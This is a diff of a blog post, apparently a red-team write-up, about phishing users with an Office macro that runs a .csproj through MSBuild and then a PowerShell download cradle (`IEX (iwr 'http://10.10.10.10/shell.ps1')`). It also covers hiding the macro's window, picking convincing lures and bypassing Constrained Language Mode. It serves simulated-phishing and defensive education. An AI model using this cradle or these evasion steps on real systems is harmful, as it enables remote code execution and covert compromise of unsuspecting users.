@@ -23,7 +23,7 @@ We can pass a ".csproj" (Visual Studio .NET C# Project file) to MSBuild and have
 
 <script src="https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0.js"></script>
 
-Within this the second stage is executed (PowerShell 3.0+ download cradle):
+This executes the second (and final) stage of the payload via PowerShell 3.0+ download cradle:
 
 `pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");`
 
@@ -35,7 +35,7 @@ Good. Now we need a means of delivering the project file and executing MSBuild. 
 
 <script src="https://gist.github.com/egre55/563159175f8d6c1d31d7f3af77357549.js"></script>
 
-In order to stand a chance of the macro being executed, we need to dress the document appropriately.
+The WindowType parameter of the Shell function has been set to `vbHide` in order to avoid calling attention to our activities. Now, in order to stand a chance of the macro being executed, we need to dress the document appropriately.
 
 John Lambert ([@JohnLaTwC](https://twitter.com/johnlatwc)) regularly shares interesting phishing lures and payloads, if you need inspiration for simulated phishing campaigns ;) . I find the "Document created in newer/older Office version" lures especially convincing. John has put together [this](https://t.co/OwH28ltngy) compendium of macro based lures, which is great for educating users about the different techniques attackers use.
 
@@ -49,10 +49,7 @@ Once the user opens the document and enables macros, the powashell.csproj is dow
 
 ![rules]({{ site.url }}/images/shell.png){: .center-image }
 
-This payload is also an effective means of bypassing PowerShell Contrained Language mode.
+We can see that this payload is also an effective means of bypassing PowerShell Contrained Language mode.
 
 Improvements
 Mitigations
-
-
-
